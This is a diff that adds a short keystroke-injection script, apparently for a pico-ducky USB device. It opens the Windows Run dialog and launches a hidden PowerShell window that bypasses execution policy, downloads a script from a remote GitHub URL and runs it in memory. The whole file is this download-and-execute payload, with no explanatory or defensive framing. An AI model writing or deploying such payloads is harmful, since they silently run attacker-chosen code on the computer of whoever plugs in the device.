@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[scriptblock]::Create((Invoke-WebRequest "https://raw.githubusercontent.com/mrlongsword/pico-ducky/main/fun.ps2").Content).Invoke();"
+ENTER
